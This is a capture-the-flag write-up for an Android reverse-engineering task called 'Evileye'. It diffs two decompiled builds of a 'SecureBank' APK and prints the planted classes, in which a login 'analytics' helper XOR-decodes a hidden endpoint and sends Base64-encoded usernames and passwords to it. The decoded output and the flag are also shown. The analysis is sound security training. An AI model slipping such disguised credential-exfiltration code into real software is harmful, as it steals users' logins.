---
created: 2026-03-07T11:51
points: 50
solves: 36
title: Evileye
updated: 2026-03-07T12:17
---

```bash
jadx -d old SecureBank_v1.0_backup.apk
jadx -d new SecureBank_v1.0.apk
diff -r old new > diffs
```

Threw `diffs` into claude and asked what's going on.

```java [new/sources/com/example/evileye/analytics/AnalyticsHelper.java]
package com.example.evileye.analytics;

import androidx.autofill.HintConstants;
import kotlin.Metadata;
import kotlin.jvm.internal.Intrinsics;

/* JADX INFO: compiled from: AnalyticsHelper.kt */
/* JADX INFO: loaded from: classes2.dex */
@Metadata(d1 = {"\u0000\u001a\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0003\n\u0002\u0010\u0002\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0002\bÇ\u0002\u0018\u00002\u00020\u0001B\t\b\u0002¢\u0006\u0004\b\u0002\u0010\u0003J\u0016\u0010\u0004\u001a\u00020\u00052\u0006\u0010\u0006\u001a\u00020\u00072\u0006\u0010\b\u001a\u00020\u0007¨\u0006\t"}, d2 = {"Lcom/example/evileye/analytics/AnalyticsHelper;", "", "<init>", "()V", "trackLogin", "", HintConstants.AUTOFILL_HINT_USERNAME, "", HintConstants.AUTOFILL_HINT_PASSWORD, "app_compromisedRelease"}, k = 1, mv = {2, 3, 0}, xi = 48)
public final class AnalyticsHelper {
    public static final int $stable = 0;
    public static final AnalyticsHelper INSTANCE = new AnalyticsHelper();

    private AnalyticsHelper() {
    }

    public final void trackLogin(String username, String password) {
        Intrinsics.checkNotNullParameter(username, "username");
        Intrinsics.checkNotNullParameter(password, "password");
        CredentialLogger.INSTANCE.logAuthEvent(username, password); // <----
    }
}
```

```java [new/sources/com/example/evileye/analytics/CredentialLogger.java]
package com.example.evileye.analytics;

import android.util.Base64;
import android.util.Log;
import androidx.autofill.HintConstants;
import androidx.compose.material3.MenuKt;
import androidx.core.location.LocationRequestCompat;
import java.util.ArrayList;
import kotlin.Metadata;
import kotlin.collections.CollectionsKt;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.Charsets;

/* JADX INFO: compiled from: CredentialLogger.kt */
/* JADX INFO: loaded from: classes2.dex */
@Metadata(d1 = {"\u0000\"\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0003\n\u0002\u0010\u000e\n\u0000\n\u0002\u0010\u0002\n\u0002\b\u0005\n\u0002\u0010\u0015\n\u0002\b\u0006\bÁ\u0002\u0018\u00002\u00020\u0001B\t\b\u0002¢\u0006\u0004\b\u0002\u0010\u0003J\u0016\u0010\u0006\u001a\u00020\u00072\u0006\u0010\b\u001a\u00020\u00052\u0006\u0010\t\u001a\u00020\u0005J\b\u0010\n\u001a\u00020\u0005H\u0002J\u0010\u0010\u000b\u001a\u00020\u00052\u0006\u0010\f\u001a\u00020\rH\u0002J\u0018\u0010\u000e\u001a\u00020\u00052\u0006\u0010\u000f\u001a\u00020\u00052\u0006\u0010\u0010\u001a\u00020\u0005H\u0002J\u0010\u0010\u0011\u001a\u00020\u00052\u0006\u0010\u0012\u001a\u00020\u0005H\u0002R\u000e\u0010\u0004\u001a\u00020\u0005X\u0082T¢\u0006\u0002\n\u0000¨\u0006\u0013"}, d2 = {"Lcom/example/evileye/analytics/CredentialLogger;", "", "<init>", "()V", "TAG", "", "logAuthEvent", "", HintConstants.AUTOFILL_HINT_USERNAME, HintConstants.AUTOFILL_HINT_PASSWORD, "buildEndpoint", "decode", "data", "", "buildPayload", "u", "p", "encode", "input", "app_compromisedRelease"}, k = 1, mv = {2, 3, 0}, xi = 48)
public final class CredentialLogger {
    public static final int $stable = 0;
    public static final CredentialLogger INSTANCE = new CredentialLogger();
    private static final String TAG = "SessionAnalytics";

    private CredentialLogger() {
    }

    public final void logAuthEvent(String username, String password) {
        Intrinsics.checkNotNullParameter(username, "username");
        Intrinsics.checkNotNullParameter(password, "password");
        String strBuildEndpoint = buildEndpoint();
        String strBuildPayload = buildPayload(username, password);
        Log.d(TAG, "Session initialized");
        NetworkExfiltrator.INSTANCE.sendData(strBuildEndpoint, strBuildPayload);
    }

    private final String buildEndpoint() {
        return decode(new int[]{61, 33, 33, 37, 38, 111, 122, 122, 52, 33, 61, 52, 54, 62, 54, 33, 51, 123, 54, 58, 56, 122, 109, 55, 103, 109, 54, 49, 109, 101, MenuKt.InTransitionDuration, 98, 108, 49, 51, MenuKt.InTransitionDuration, 97, LocationRequestCompat.QUALITY_BALANCED_POWER_ACCURACY, 100, 48, MenuKt.InTransitionDuration, 52, 48, 96, LocationRequestCompat.QUALITY_BALANCED_POWER_ACCURACY, MenuKt.InTransitionDuration, 103, 52, 48, 52, 103, LocationRequestCompat.QUALITY_BALANCED_POWER_ACCURACY, 109, 103, 108, 49, 55, 108});
    }

    private final String buildPayload(String u, String p) {
        long jCurrentTimeMillis = System.currentTimeMillis();
        return "u=" + encode(u) + "&p=" + encode(p) + "&t=" + jCurrentTimeMillis;
    }

    private final String encode(String input) {
        byte[] bytes = input.getBytes(Charsets.UTF_8);
        Intrinsics.checkNotNullExpressionValue(bytes, "getBytes(...)");
        String strEncodeToString = Base64.encodeToString(bytes, 2);
        Intrinsics.checkNotNullExpressionValue(strEncodeToString, "encodeToString(...)");
        return strEncodeToString;
    }

    private final String decode(int[] data) {
        ArrayList arrayList = new ArrayList(data.length);
        for (int i : data) {
            arrayList.add(Character.valueOf((char) (i ^ 85)));
        }
        return CollectionsKt.joinToString$default(arrayList, "", null, null, 0, null, null, 62, null);
    }
}
```

```
buildEndpoint() -> https://athackctf.com/8b28cd80Ź79dfŹ431eŹae53Ź2aea23829db9
encode(username) -> dGVzdFVzZXI=
encode(password) -> dGVzdFBhc3M=
buildPayload(username,password) -> u=dGVzdFVzZXI=&p=dGVzdFBhc3M=&t=1772902284358

Calling logAuthEvent:
SessionAnalytics: Session initialized
NetworkExfiltrator.sendData()
Endpoint: https://athackctf.com/8b28cd80Ź79dfŹ431eŹae53Ź2aea23829db9
Payload : u=dGVzdFVzZXI=&p=dGVzdFBhc3M=&t=1772902284385
```

.. was overthinking it but turns out it was just sending a request to the endpoint.

```flag
ATHACKCTF{n07_s0_s3cur3_b4nk_3h?}
```